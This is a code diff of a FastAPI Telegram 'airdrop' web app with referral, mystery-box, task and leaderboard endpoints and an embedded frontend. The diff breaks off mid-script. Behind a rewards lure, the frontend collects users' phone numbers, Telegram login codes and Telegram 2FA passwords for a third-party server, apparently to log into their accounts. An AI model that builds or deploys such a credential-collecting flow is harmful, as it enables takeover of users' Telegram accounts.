-@app.post("/api/v1/claim/mystery-box")
-async def claim_box(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    result = await user_repo.mystery_box(user_id)
-    await hub.broadcast("stats_update", await build_stats_payload(user_id))
-    return {"status": "success", **result}
-
-
-@app.get("/api/v1/tasks")
-async def list_tasks(_: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    tasks = await task_repo.list_active()
-    completions = await db.fetchall("SELECT task_id FROM task_completions WHERE user_id=?", (user_id,))
-    done = {int(r["task_id"]) for r in completions}
-    return {
-        "status": "success",
-        "tasks": [
-            {**t, "completed": int(t["id"]) in done}
-            for t in tasks
-        ],
-    }
-
-
-@app.post("/api/v1/tasks/complete")
-async def complete_task(payload: TaskCompleteRequest, _: Request, claims: Dict[str, Any] = Depends(require_web_user)):
-    user_id = int(claims["sub"])
-    result = await task_repo.complete(user_id, payload.task_id)
-    await hub.broadcast("stats_update", await build_stats_payload(user_id))
-    return {"status": "success", **result}
-
-
-@app.get("/api/v1/rewards")
-async def list_rewards(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(20, ge=1, le=100)):
-    user_id = int(claims["sub"])
-    return {"status": "success", "items": await user_repo.rewards_for_user(user_id, limit=limit)}
-
-
-@app.get("/api/v1/transactions")
-async def list_transactions(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(50, ge=1, le=100)):
-    user_id = int(claims["sub"])
-    return {"status": "success", "items": await tx_repo.list_by_user(user_id, limit=limit)}
-
-
-@app.get("/api/v1/leaderboard")
-async def leaderboard(_: Request, claims: Dict[str, Any] = Depends(require_web_user), limit: int = Query(10, ge=1, le=50)):
-    _ = claims
-    return {"status": "success", "items": await user_repo.list_top(limit=limit)}
-
-
-# =============================================================================
-# Admin endpoints
-# =============================================================================
-
-@app.post("/api/v1/admin/login")
-async def admin_login(payload: AdminLoginRequest):
-    row = await db.fetchone("SELECT * FROM admins WHERE username=?", (payload.username,))
-    if not row:
-        raise HTTPException(status_code=403, detail="Invalid admin credentials.")
-    admin = dict(row)
-    if not Security.verify_admin_password(payload.password, admin["password_hash"]):
-        raise HTTPException(status_code=403, detail="Invalid admin credentials.")
-    token = Security.sign_jwt(admin["username"], {"role": "admin", "api_key": admin["api_key"]})
-    return {"status": "success", "token": token, "api_key": admin["api_key"]}
-
-
-@app.get("/api/v1/admin/summary")
-async def admin_summary(_: Request, __: None = Depends(require_admin_api_key)):
-    users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
-    rewards = await db.fetchone("SELECT COUNT(*) AS c FROM rewards")
-    tasks = await db.fetchone("SELECT COUNT(*) AS c FROM tasks")
-    txs = await db.fetchone("SELECT COUNT(*) AS c FROM transactions")
-    return {
-        "status": "success",
-        "users": int(users["c"]) if users else 0,
-        "rewards": int(rewards["c"]) if rewards else 0,
-        "tasks": int(tasks["c"]) if tasks else 0,
-        "transactions": int(txs["c"]) if txs else 0,
-    }
-
-
-@app.get("/api/v1/admin/users")
-async def admin_users(_: Request, __: None = Depends(require_admin_api_key)):
-    rows = await db.fetchall("SELECT * FROM users ORDER BY id DESC")
-    return {"status": "success", "items": [dict(r) for r in rows]}
-
-
-@app.post("/api/v1/admin/tasks")
-async def admin_create_task(payload: TaskCreateRequest, _: Request, __: None = Depends(require_admin_api_key)):
-    item = await task_repo.create(payload)
-    return {"status": "success", "item": item}
-
-
-@app.get("/api/v1/admin/tasks")
-async def admin_list_tasks(_: Request, __: None = Depends(require_admin_api_key)):
-    rows = await db.fetchall("SELECT * FROM tasks ORDER BY id DESC")
-    return {"status": "success", "items": [dict(r) for r in rows]}
-
-
-@app.post("/api/v1/admin/reindex")
-async def admin_reindex(_: Request, __: None = Depends(require_admin_api_key)):
-    await db.executescript(SCHEMA_SQL)  # type: ignore[attr-defined]
-    return {"status": "success"}
-
-
-# =============================================================================
-# WebSocket
-# =============================================================================
-
-@app.websocket("/ws/stats")
-async def ws_stats(ws: WebSocket):
-    await hub.connect(ws)
-    try:
-        while True:
-            msg = await ws.receive_text()
-            if msg == "ping":
-                await ws.send_text(json.dumps({"event": "pong", "data": {"ts": time.time()}}))
-    except WebSocketDisconnect:
-        pass
-    finally:
-        await hub.disconnect(ws)
-
-
-async def periodic_cleanup():
-    while True:
+async def require_admin(request: Request) -> None:
+    api_key = request.headers.get("X-Admin-Key")
+    if api_key and api_key == settings.ADMIN_API_KEY:
+        return
+    token = request.cookies.get("admin_access_token")
+    if token:
         try:
-            await auth_manager.cleanup_expired()
+            payload = decode_token(token, "admin")
+            if payload.get("sub") == settings.ADMIN_USERNAME:
+                return
         except Exception:
-            log.exception("cleanup task failed")
-        await asyncio.sleep(30)
+            pass
+    raise HTTPException(status_code=403, detail="Admin access denied.")
 
 
-async def periodic_broadcast():
-    while True:
-        try:
-            users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
-            balance = await db.fetchone("SELECT COALESCE(SUM(balance),0) AS total FROM users")
-            top = await user_repo.list_top(10)
-            await hub.broadcast(
-                "stats_update",
-                {
-                    "users": int(users["c"]) if users else 0,
-                    "global_balance": int(balance["total"]) if balance else 0,
-                    "leaderboard": top,
-                },
-            )
-        except Exception:
-            log.exception("broadcast task failed")
-        await asyncio.sleep(20)
-
-
-# =============================================================================
-# Frontend SPA
-# =============================================================================
+# ---------------------------------------------------------------------------
+# HTML SPA
+# ---------------------------------------------------------------------------
 
 FRONTEND_HTML = r"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Pro Shop Ultimate</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pro Shop Ultimate Enterprise</title>
   <style>
-    :root{
-      --bg:#081018;
-      --bg2:rgba(12,18,28,.70);
-      --card:rgba(12,18,28,.52);
-      --card2:rgba(18,24,36,.82);
-      --line:rgba(255,255,255,.10);
-      --txt:#ecf3ff;
-      --muted:#91a4c2;
-      --accent:#7c5cff;
-      --accent2:#22d3ee;
-      --good:#22c55e;
-      --warn:#f59e0b;
-      --bad:#ef4444;
-      --radius:26px;
-      --shadow:0 30px 80px rgba(0,0,0,.40);
-      font-synthesis-weight:none;
+    :root {
+      --bg:#070b14; --panel:rgba(16,24,40,.7); --panel2:rgba(22,30,52,.72); --line:rgba(255,255,255,.08);
+      --text:#e8eefc; --muted:#8f9bb8; --accent:#6d7cff; --accent2:#22d3ee; --good:#34d399; --bad:#fb7185; --gold:#f59e0b;
+      --shadow:0 18px 60px rgba(0,0,0,.35); --radius:24px;
     }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
-      color:var(--txt);
-      background:
-        radial-gradient(circle at 20% 20%, rgba(124,92,255,.22), transparent 30%),
-        radial-gradient(circle at 80% 18%, rgba(34,211,238,.20), transparent 28%),
-        radial-gradient(circle at 50% 80%, rgba(34,197,94,.12), transparent 25%),
-        linear-gradient(180deg, #050a12 0%, #07111e 100%);
-      overflow-x:hidden;
-    }
-    .noise::before{
-      content:"";
-      position:fixed; inset:0;
-      pointer-events:none;
-      background-image:linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
-      background-size:32px 32px;
-      opacity:.22;
-      mask-image:linear-gradient(180deg, rgba(0,0,0,.90), rgba(0,0,0,.30));
-    }
-    .wrap{width:min(1240px, calc(100% - 32px)); margin:0 auto; padding:24px 0 60px}
-    .topbar{
-      display:flex; align-items:center; justify-content:space-between;
-      gap:16px; margin-bottom:18px;
-      position:sticky; top:0; z-index:20;
-      backdrop-filter:blur(18px);
-      padding:14px 18px;
-      border:1px solid var(--line);
-      border-radius:999px;
-      background:rgba(6,10,16,.58);
-      box-shadow:var(--shadow);
-    }
-    .brand{display:flex; align-items:center; gap:12px}
-    .logo{
-      width:44px; height:44px; border-radius:16px;
-      display:grid; place-items:center;
-      background:linear-gradient(135deg, var(--accent), var(--accent2));
-      box-shadow:0 12px 40px rgba(124,92,255,.35);
-      font-weight:900; color:white;
-    }
-    .brand h1{font-size:15px; margin:0}
-    .brand p{margin:0; font-size:12px; color:var(--muted)}
-    .top-actions{display:flex; gap:10px; flex-wrap:wrap}
-    .pill, .btn{
-      border:1px solid var(--line);
-      background:rgba(255,255,255,.04);
-      color:var(--txt);
-      padding:12px 16px;
-      border-radius:999px;
-      cursor:pointer;
-      transition:.18s ease;
-      text-decoration:none;
-      display:inline-flex; align-items:center; gap:8px;
-      font-weight:700;
-    }
-    .pill:hover, .btn:hover{transform:translateY(-1px); background:rgba(255,255,255,.07)}
-    .hero{
-      display:grid;
-      grid-template-columns:1.25fr .85fr;
-      gap:18px;
-      margin-top:18px;
-    }
-    .panel{
-      background:linear-gradient(180deg, rgba(13,19,31,.72), rgba(9,14,23,.55));
-      backdrop-filter:blur(22px);
-      border:1px solid var(--line);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-      overflow:hidden;
-    }
-    .hero-card{padding:28px}
-    .eyebrow{
-      display:inline-flex; align-items:center; gap:8px;
-      color:#d9e4ff; font-size:12px; letter-spacing:.12em; text-transform:uppercase;
-      padding:8px 12px; border-radius:999px; background:rgba(124,92,255,.12); border:1px solid rgba(124,92,255,.24)
-    }
-    .hero h2{margin:16px 0 10px; font-size:42px; line-height:1.04}
-    .hero p{margin:0; color:var(--muted); max-width:60ch; line-height:1.7}
-    .stats{
-      display:grid; grid-template-columns:repeat(3, 1fr); gap:12px; margin-top:24px
-    }
-    .stat{
-      padding:16px; border-radius:22px; background:rgba(255,255,255,.04); border:1px solid var(--line)
-    }
-    .stat .n{font-size:26px; font-weight:900}
-    .stat .l{font-size:12px; color:var(--muted)}
-    .auth{
-      padding:24px; display:grid; gap:14px
-    }
-    .field{display:grid; gap:8px}
-    .field label{font-size:12px; color:var(--muted); text-transform:uppercase; letter-spacing:.08em}
-    input, textarea, select{
-      width:100%; border-radius:18px; border:1px solid var(--line);
-      background:rgba(255,255,255,.04); color:var(--txt);
-      padding:15px 16px; outline:none; font:inherit;
-    }
-    input:focus, textarea:focus, select:focus{border-color:rgba(34,211,238,.5); box-shadow:0 0 0 4px rgba(34,211,238,.12)}
-    .otp{display:grid; grid-template-columns:repeat(6,1fr); gap:10px}
-    .otp input{text-align:center; font-size:20px; font-weight:800; padding:16px 8px}
-    .accent{background:linear-gradient(135deg, var(--accent), var(--accent2)); border:none; color:#fff}
-    .accent:hover{filter:brightness(1.04)}
-    .subgrid{
-      display:grid; grid-template-columns:repeat(4, 1fr); gap:18px; margin-top:18px
-    }
-    .card{
-      padding:22px; border-radius:var(--radius);
-      background:var(--card); border:1px solid var(--line); backdrop-filter:blur(20px);
-      box-shadow:var(--shadow);
-    }
-    .card h3{margin:0 0 8px; font-size:16px}
-    .card p{margin:0; color:var(--muted); line-height:1.6}
-    .row{display:flex; align-items:center; justify-content:space-between; gap:14px}
-    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace}
-    .tabs{display:flex; gap:10px; flex-wrap:wrap; margin-top:18px}
-    .tab{padding:10px 14px; border-radius:999px; border:1px solid var(--line); background:rgba(255,255,255,.04); cursor:pointer}
-    .tab.active{background:rgba(124,92,255,.22); border-color:rgba(124,92,255,.3)}
-    .grid2{display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-top:18px}
-    .list{display:grid; gap:10px}
-    .item{
-      display:flex; align-items:center; justify-content:space-between; gap:16px;
-      padding:14px 16px; border-radius:18px; background:rgba(255,255,255,.035); border:1px solid var(--line)
-    }
-    .badge{padding:6px 10px; border-radius:999px; background:rgba(34,211,238,.13); color:#9ee7ff; font-size:12px}
-    .reward{padding:18px; border-radius:18px; background:linear-gradient(180deg, rgba(124,92,255,.18), rgba(34,211,238,.10)); border:1px solid rgba(255,255,255,.10)}
-    .mystery{
-      display:grid; place-items:center; min-height:280px;
-      background:
-        radial-gradient(circle at 50% 50%, rgba(124,92,255,.36), transparent 48%),
-        linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
-      border-radius:28px; border:1px solid rgba(255,255,255,.10)
-    }
-    .box{
-      width:140px; height:140px; border-radius:34px; display:grid; place-items:center;
-      font-size:64px; cursor:pointer; user-select:none;
-      background:linear-gradient(135deg, #7c5cff, #22d3ee);
-      box-shadow:0 20px 50px rgba(124,92,255,.35);
-      animation:float 3s ease-in-out infinite;
-    }
-    @keyframes float{50%{transform:translateY(-8px)}}
-    .muted{color:var(--muted)}
-    .toast{
-      position:fixed; right:18px; bottom:18px; z-index:9999;
-      max-width:360px; padding:14px 16px; border-radius:18px;
-      background:rgba(8,16,24,.86); border:1px solid var(--line); box-shadow:var(--shadow);
-      backdrop-filter:blur(18px); display:none
-    }
-    .toast.show{display:block; animation:pop .18s ease}
-    @keyframes pop{from{transform:translateY(12px); opacity:0} to{transform:translateY(0); opacity:1}}
-    .footer{margin-top:18px; color:var(--muted); font-size:12px; text-align:center}
-    @media (max-width: 1060px){
-      .hero,.grid2,.subgrid{grid-template-columns:1fr}
-      .subgrid{grid-template-columns:repeat(2,1fr)}
-      .stats{grid-template-columns:1fr}
-      .hero h2{font-size:34px}
-    }
-    @media (max-width: 700px){
-      .wrap{width:min(100% - 20px, 1240px)}
-      .topbar{border-radius:28px; padding:14px}
-      .otp{grid-template-columns:repeat(3,1fr)}
-      .subgrid{grid-template-columns:1fr}
-      .hero h2{font-size:28px}
-    }
+    *{box-sizing:border-box} html,body{height:100%} body{margin:0;font-family:Inter,system-ui,Segoe UI,Arial;background:
+      radial-gradient(circle at top left, rgba(109,124,255,.15), transparent 30%),
+      radial-gradient(circle at bottom right, rgba(34,211,238,.12), transparent 28%), var(--bg);
+      color:var(--text); overflow-x:hidden}
+    .wrap{max-width:1280px;margin:0 auto;padding:28px} .grid{display:grid;grid-template-columns:1.12fr .88fr;gap:22px}
+    .card{background:linear-gradient(180deg,var(--panel),var(--panel2));backdrop-filter:blur(18px);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
+    .hero{padding:28px 28px 22px;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;gap:18px;align-items:center}
+    .brand{display:flex;gap:14px;align-items:center}.logo{width:54px;height:54px;border-radius:18px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;font-weight:900;color:#06101b;box-shadow:0 12px 35px rgba(109,124,255,.35)}
+    h1{margin:0;font-size:24px}.sub{margin:6px 0 0;color:var(--muted);font-size:14px}.pill{padding:10px 14px;border-radius:999px;background:rgba(255,255,255,.06);border:1px solid var(--line);color:var(--muted);font-size:13px}
+    .content{padding:22px 28px 28px}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:18px}
+    .stat{padding:16px;border-radius:20px;background:rgba(255,255,255,.04);border:1px solid var(--line)}.stat .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.12em}.stat .v{font-size:26px;font-weight:800;margin-top:8px}
+    .two{display:grid;grid-template-columns:1fr 1fr;gap:18px}.pane{padding:18px;border-radius:20px;background:rgba(255,255,255,.04);border:1px solid var(--line)}
+    label{display:block;font-size:12px;color:var(--muted);margin:0 0 8px;letter-spacing:.08em;text-transform:uppercase} input,textarea,button,select{font:inherit}
+    input,textarea,select{width:100%;padding:14px 16px;border-radius:16px;background:rgba(0,0,0,.18);color:var(--text);border:1px solid var(--line);outline:none}
+    input:focus,textarea:focus,select:focus{border-color:rgba(109,124,255,.55);box-shadow:0 0 0 4px rgba(109,124,255,.12)}
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+    button{border:none;cursor:pointer;padding:13px 16px;border-radius:16px;font-weight:700;color:#04111e;background:linear-gradient(135deg,var(--accent),var(--accent2));box-shadow:0 10px 25px rgba(109,124,255,.18)}
+    button.secondary{background:rgba(255,255,255,.08);color:var(--text);border:1px solid var(--line)} button.good{background:linear-gradient(135deg,#34d399,#10b981)} button.bad{background:linear-gradient(135deg,#fb7185,#f43f5e);color:#fff}
+    .hidden{display:none!important}.tabs{display:flex;gap:8px;flex-wrap:wrap}.tab{padding:10px 14px;border-radius:999px;background:rgba(255,255,255,.05);border:1px solid var(--line);color:var(--muted);cursor:pointer}.tab.active{background:rgba(109,124,255,.18);color:var(--text);border-color:rgba(109,124,255,.35)}
+    .list{display:grid;gap:12px}.item{padding:14px;border-radius:18px;background:rgba(255,255,255,.04);border:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;align-items:center}
+    .item b{display:block}.muted{color:var(--muted)} .badge{padding:8px 11px;border-radius:999px;background:rgba(255,255,255,.06);color:var(--muted);border:1px solid var(--line);font-size:12px}
+    .refbox{display:flex;gap:10px;align-items:center;justify-content:space-between;padding:14px 16px;border-radius:16px;background:rgba(255,255,255,.05);border:1px dashed rgba(255,255,255,.13)}
+    .table{width:100%;border-collapse:collapse}.table th,.table td{padding:12px 10px;text-align:left;border-bottom:1px solid var(--line);font-size:14px}.table th{color:var(--muted);font-weight:600}
+    .otp{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}.otp input{text-align:center;font-size:18px;font-weight:800;letter-spacing:.06em}
+    .toast{position:fixed;right:18px;bottom:18px;padding:14px 16px;border-radius:16px;background:#09111f;border:1px solid var(--line);box-shadow:var(--shadow);max-width:380px;display:none;z-index:50}
+    .toast.show{display:block;animation:pop .2s ease} @keyframes pop{from{transform:translateY(10px);opacity:0}to{transform:translateY(0);opacity:1}}
+    .small{font-size:12px}.center{display:grid;place-items:center}.gap{height:10px}
+    @media (max-width: 980px){.grid,.two,.stats,.row{grid-template-columns:1fr}.hero{flex-direction:column;align-items:flex-start}}
   </style>
 </head>
-<body class="noise">
+<body>
   <div class="wrap">
-    <div class="topbar panel">
-      <div class="brand">
-        <div class="logo">PS</div>
-        <div>
-          <h1>Pro Shop Ultimate</h1>
-          <p>Telegram Airdrop • Auth • Rewards • Tasks</p>
+    <div class="grid">
+      <section class="card">
+        <div class="hero">
+          <div class="brand">
+            <div class="logo">PS</div>
+            <div>
+              <h1>Pro Shop Ultimate Enterprise</h1>
+              <div class="sub">Telegram Airdrop, Referral, Daily Claim, Mystery Box, Tasks, and Live Leaderboard</div>
+            </div>
+          </div>
+          <div class="pill" id="statusPill">Unauthenticated</div>
         </div>
-      </div>
-      <div class="top-actions">
-        <button class="pill" id="btnTheme">⚡ Glass</button>
-        <button class="pill" id="btnCopyRef">🔗 Copy Ref</button>
-        <a class="pill" href="/docs" target="_blank">📘 API Docs</a>
-      </div>
-    </div>
-
-    <div class="hero">
-      <div class="panel hero-card">
-        <div class="eyebrow">Enterprise Airdrop Dashboard</div>
-        <h2>Premium referral machine, mystery box, daily rewards, tasks, leaderboard.</h2>
-        <p>Modern Telegram authentication with MTProto, a clean invitation economy, and a real-time dashboard designed for high-conversion airdrops and internal growth loops.</p>
-
-        <div class="stats">
-          <div class="stat"><div class="n" id="statUsers">0</div><div class="l">Users</div></div>
-          <div class="stat"><div class="n" id="statCoins">0</div><div class="l">Global Balance</div></div>
-          <div class="stat"><div class="n" id="statRank">#-</div><div class="l">Your Rank</div></div>
+        <div class="content">
+          <div class="stats">
+            <div class="stat"><div class="k">Balance</div><div class="v" id="statBalance">0</div></div>
+            <div class="stat"><div class="k">Referrals</div><div class="v" id="statRefs">0</div></div>
+            <div class="stat"><div class="k">Tasks</div><div class="v" id="statTasks">0</div></div>
+            <div class="stat"><div class="k">Gifts</div><div class="v" id="statGifts">0</div></div>
+          </div>
+          <div class="tabs" style="margin-bottom:14px">
+            <div class="tab active" data-tab="auth">Auth</div>
+            <div class="tab" data-tab="dash">Dashboard</div>
+            <div class="tab" data-tab="tasks">Tasks</div>
+            <div class="tab" data-tab="leaderboard">Leaderboard</div>
+          </div>
+          <div id="tab-auth" class="pane">
+            <div class="row">
+              <div>
+                <label>Phone</label>
+                <input id="phone" placeholder="+1234567890">
+              </div>
+              <div>
+                <label>Referral Code (optional)</label>
+                <input id="refCode" placeholder="ref_xxxx">
+              </div>
+            </div>
+            <div class="actions"><button id="sendCode">Send Code</button><button class="secondary" id="clearAuth">Reset</button></div>
+            <div class="gap"></div>
+            <div id="codeStep" class="hidden">
+              <label>Verification Code</label>
+              <div class="otp" id="otp"></div>
+              <div class="actions"><button id="verifyCode">Verify Code</button></div>
+            </div>
+            <div class="gap"></div>
+            <div id="twofaStep" class="hidden">
+              <label>2FA Password</label>
+              <input id="twofa" type="password" placeholder="Telegram 2FA password">
+              <div class="actions"><button id="verify2FA">Verify 2FA</button></div>
+            </div>
+          </div>
+          <div id="tab-dash" class="pane hidden">
+            <div class="refbox"><div><div class="muted small">Referral link</div><b id="refLink">-</b></div><button class="secondary" id="copyRef">Copy</button></div>
+            <div class="gap"></div>
+            <div class="actions"><button class="good" id="claimDaily">Claim Daily +1</button><button id="openGift">Open Mystery Box (17)</button><button class="secondary" id="logout">Logout</button></div>
+            <div class="gap"></div>
+            <div class="list" id="rewards"></div>
+          </div>
+          <div id="tab-tasks" class="pane hidden"><div class="list" id="taskList"></div></div>
+          <div id="tab-leaderboard" class="pane hidden"><table class="table"><thead><tr><th>#</th><th>User</th><th>Refs</th><th>Balance</th></tr></thead><tbody id="leaderBody"></tbody></table></div>
         </div>
-      </div>
-
-      <div class="panel auth">
-        <div class="row">
-          <div>
-            <div class="eyebrow" style="padding:6px 10px">Login</div>
-            <h3 style="margin:10px 0 0">Authenticate via Telegram</h3>
+      </section>
+      <aside class="card">
+        <div class="hero"><div class="brand"><div class="logo">AI</div><div><h1>Live Stats</h1><div class="sub">WebSocket leaderboard and reward feed</div></div></div><div class="pill" id="connPill">WS: idle</div></div>
+        <div class="content">
+          <div class="pane">
+            <div class="muted small">Current user</div>
+            <h2 id="userName" style="margin:8px 0 0">Guest</h2>
+            <div class="muted" id="userInfo">Login to unlock dashboard</div>
+          </div>
+          <div class="gap"></div>
+          <div class="pane">
+            <div class="muted small">Recent reward</div>
+            <h2 id="lastReward" style="margin:8px 0 0">-</h2>
+            <div class="muted" id="rewardInfo">Mystery Box may grant Stars or 1 Month Premium.</div>
           </div>
         </div>
-        <div class="field">
-          <label>Phone</label>
-          <input id="phone" placeholder="+491234567890" />
-        </div>
-        <div class="field">
-          <label>Referral Code</label>
-          <input id="refCode" placeholder="optional" />
-        </div>
-        <button class="btn accent" id="btnSend">Send Code</button>
-
-        <div class="field">
-          <label>OTP</label>
-          <div class="otp" id="otpBox">
-            <input maxlength="1" inputmode="numeric" />
-            <input maxlength="1" inputmode="numeric" />
-            <input maxlength="1" inputmode="numeric" />
-            <input maxlength="1" inputmode="numeric" />
-            <input maxlength="1" inputmode="numeric" />
-            <input maxlength="1" inputmode="numeric" />
-          </div>
-        </div>
-        <button class="btn accent" id="btnVerify">Verify Code</button>
-        <input id="password" type="password" placeholder="2FA password (if enabled)" />
-        <button class="btn" id="btn2fa">Verify 2FA</button>
-        <div class="muted" id="loginStatus">Ready.</div>
-      </div>
+      </aside>
     </div>
-
-    <div class="subgrid">
-      <div class="card">
-        <h3>Profile</h3>
-        <p id="profileName">Guest</p>
-        <p class="mono" id="profilePhone">—</p>
-      </div>
-      <div class="card">
-        <h3>Referral</h3>
-        <p class="mono" id="refLink">—</p>
-      </div>
-      <div class="card">
-        <h3>Balance</h3>
-        <p><span class="mono" id="balance">0</span> coins</p>
-      </div>
-      <div class="card">
-        <h3>Tasks</h3>
-        <p><span class="mono" id="tasksDone">0</span> done</p>
-      </div>
-    </div>
-
-    <div class="grid2">
-      <div class="panel card">
-        <div class="row"><h3>Mystery Box</h3><span class="badge">17 coins</span></div>
-        <div class="mystery" style="margin-top:14px">
-          <div class="box" id="box">🎁</div>
-        </div>
-        <div class="row" style="margin-top:14px">
-          <button class="btn accent" id="btnDaily">Claim Daily +1</button>
-          <button class="btn" id="btnOpenBox">Open Box</button>
-        </div>
-        <div class="reward" style="margin-top:14px" id="rewardBox">No reward yet.</div>
-      </div>
-
-      <div class="panel card">
-        <div class="row"><h3>Leaderboard</h3><span class="badge">Live</span></div>
-        <div class="list" id="leaderboard" style="margin-top:14px"></div>
-      </div>
-    </div>
-
-    <div class="grid2">
-      <div class="panel card">
-        <div class="row"><h3>Tasks</h3><span class="badge">Dynamic</span></div>
-        <div class="list" id="tasks" style="margin-top:14px"></div>
-      </div>
-      <div class="panel card">
-        <div class="row"><h3>Recent Rewards</h3><span class="badge">History</span></div>
-        <div class="list" id="rewards" style="margin-top:14px"></div>
-      </div>
-    </div>
-
-    <div class="footer">Realtime updates via WebSocket • Vanilla JS SPA • Glassmorphism UI</div>
   </div>
-
   <div class="toast" id="toast"></div>
-
 <script>
-let accessToken = "";
-let csrfToken = "";
-let userId = null;
-let sessionId = null;
-let currentProfile = null;
-let ws = null;
-
-const el = (id) => document.getElementById(id);
-const toast = (msg) => {
-  const t = el("toast");
-  t.textContent = msg;
-  t.classList.add("show");
-  clearTimeout(window.__t);
-  window.__t = setTimeout(() => t.classList.remove("show"), 2600);
-};
-
-const setStatus = (msg) => el("loginStatus").textContent = msg;
-
-const otpInputs = Array.from(document.querySelectorAll("#otpBox input"));
-otpInputs.forEach((input, idx) => {
-  input.addEventListener("input", () => {
-    input.value = input.value.replace(/[^0-9]/g, "").slice(0, 1);
-    if (input.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
-  });
-  input.addEventListener("keydown", (e) => {
-    if (e.key === "Backspace" && !input.value && idx > 0) otpInputs[idx - 1].focus();
-  });
-});
-
-function otpValue() {
-  return otpInputs.map(i => i.value).join("");
-}
-
-async function api(path, {method="GET", body=null, auth=true}={}) {
-  const headers = {"Content-Type": "application/json"};
-  if (auth && accessToken) headers["Authorization"] = `Bearer ${accessToken}`;
-  if (auth && csrfToken) headers["X-CSRF-Token"] = csrfToken;
-  const r = await fetch(path, {
-    method,
-    headers,
-    body: body ? JSON.stringify(body) : null,
-    credentials: "include",
-  });
-  let j = {};
-  try { j = await r.json(); } catch {}
-  if (!r.ok) throw new Error(j.detail || j.message || `HTTP ${r.status}`);
-  return j;
-}
-
-async function loadMe() {
-  const r = await api("/api/v1/me");
-  currentProfile = r.user;
-  userId = currentProfile.id;
-  el("profileName").textContent = `${currentProfile.first_name || ""} ${currentProfile.last_name || ""}`.trim() || "User";
-  el("profilePhone").textContent = currentProfile.phone || "—";
-  el("refLink").textContent = currentProfile.ref_code ? `${location.origin}/?ref=${currentProfile.ref_code}` : "—";
-  el("balance").textContent = currentProfile.balance ?? 0;
-  el("tasksDone").textContent = (r.tasks || []).filter(t => t.completed).length;
-  el("rewards").innerHTML = (r.rewards || []).slice(0, 8).map(x => `
-    <div class="item">
-      <div>
-        <div><strong>${x.kind}</strong> • ${x.amount}</div>
-        <div class="muted" style="font-size:12px">${new Date(x.created_at).toLocaleString()}</div>
-      </div>
-      <span class="badge">${x.kind}</span>
-    </div>
-  `).join("") || `<div class="muted">No rewards yet.</div>`;
-  el("tasks").innerHTML = (r.tasks || []).map(task => `
-    <div class="item">
-      <div>
-        <div><strong>${task.title}</strong></div>
-        <div class="muted" style="font-size:12px">${task.description}</div>
-      </div>
-      <button class="btn" ${task.completed ? "disabled" : ""} data-task="${task.id}">${task.completed ? "Done" : `+${task.reward}`}</button>
-    </div>
-  `).join("");
-  document.querySelectorAll("[data-task]").forEach(btn => btn.onclick = async () => {
-    try {
-      const id = Number(btn.dataset.task);
-      const res = await api("/api/v1/tasks/complete", {method:"POST", body:{task_id:id}});
-      toast(`Task completed: +${res.reward}`);
-      await refresh();
-    } catch (e) { toast(e.message); }
-  });
-  el("leaderboard").innerHTML = (r.leaderboard || []).map((u, idx) => `
-    <div class="item">
-      <div>
-        <div><strong>#${idx+1} ${u.first_name || "User"}</strong></div>
-        <div class="muted" style="font-size:12px">@${u.username || "unknown"} • ${u.referrals} referrals</div>
-      </div>
-      <span class="badge">${u.balance} coins</span>
-    </div>
-  `).join("") || `<div class="muted">No leaderboard data.</div>`;
-  const rank = (r.leaderboard || []).findIndex(x => x.telegram_id === currentProfile.telegram_id) + 1;
-  el("statRank").textContent = rank > 0 ? `#${rank}` : "#-";
-  el("statUsers").textContent = r.leaderboard ? r.leaderboard.length : 0;
-  el("statCoins").textContent = currentProfile.balance || 0;
-}
-
-async function refresh() {
-  await loadMe();
-}
-
-async function bindWs() {
-  if (ws) try { ws.close(); } catch {}
-  ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws/stats");
-  ws.onmessage = async (ev) => {
-    try {
-      const msg = JSON.parse(ev.data);
-      if (msg.event === "stats_update" && currentProfile) {
-        await refresh();
-      }
-    } catch {}
-  };
-}
-
-el("btnSend").onclick = async () => {
-  try {
-    const phone = el("phone").value.trim();
-    const refCode = el("refCode").value.trim() || new URLSearchParams(location.search).get("ref");
-    const res = await api("/api/v1/auth/telegram/send-code", {
-      method:"POST",
-      auth:false,
-      body:{phone, ref_code: refCode || null},
-    });
-    sessionId = res.session_id;
-    setStatus("Code sent. Check Telegram app.");
-    toast("Verification code sent.");
-  } catch (e) { toast(e.message); }
-};
-
-el("btnVerify").onclick = async () => {
-  try {
-    const code = otpValue();
-    const res = await api("/api/v1/auth/telegram/verify-code", {
-      method:"POST",
-      auth:false,
-      body:{session_id:sessionId, code},
-    });
-    if (res.status === "2fa_required") {
-      setStatus("2FA required.");
-      toast("2FA required.");
-      return;
-    }
-    accessToken = res.web_token;
-    csrfToken = res.csrf_token;
-    userId = res.user.id;
